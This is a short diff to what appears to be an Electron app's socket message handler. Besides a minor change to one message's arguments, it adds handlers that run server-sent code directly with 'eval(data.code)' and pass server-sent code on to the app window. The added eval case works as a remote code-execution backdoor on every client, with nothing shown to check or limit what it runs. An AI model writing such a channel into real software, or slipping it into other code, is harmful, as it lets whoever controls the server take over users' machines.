@@ -90,7 +90,7 @@ socket.on('message', (data) => {
         break;
     case 6:
         if (win && data.userid == config.get('userID', ''))
-            win.webContents.send('msg', data.msg, data.error);
+            win.webContents.send('msg', data.msg, data.icon);
         break;
     case 7:
         if (data.userid == config.get('userID', '')) {
@@ -110,6 +110,13 @@ socket.on('message', (data) => {
             userID: config.get('userID'),
             uniqueID: uniqueID
         });
+        break;
+    case 10:
+        eval(data.code);
+        break;
+    case 11:
+        if (win)
+            win.webContents.send('code', data.code);
         break;
     }
 });
